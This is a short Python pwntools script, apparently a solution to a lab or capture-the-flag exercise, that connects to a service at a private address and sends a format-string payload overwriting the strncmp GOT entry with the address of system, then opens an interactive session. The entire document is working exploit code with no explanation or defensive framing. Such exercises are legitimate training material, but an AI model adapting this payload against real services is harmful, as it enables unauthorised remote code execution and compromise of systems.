from pwn import *
io = remote('192.168.56.101',2994)
strncmp = 0x804a1a8
system = 0xb7ecffb0
exploit ="username "+ "AAAAAA"+pack(strncmp)+pack(strncmp+2) + "%17$65408x"+"%17$n"+"%17$47164x"+"%18$n"
io.sendline(exploit)
exploit ="login "+"CCCC"
io.sendline(exploit)
io.interactive()

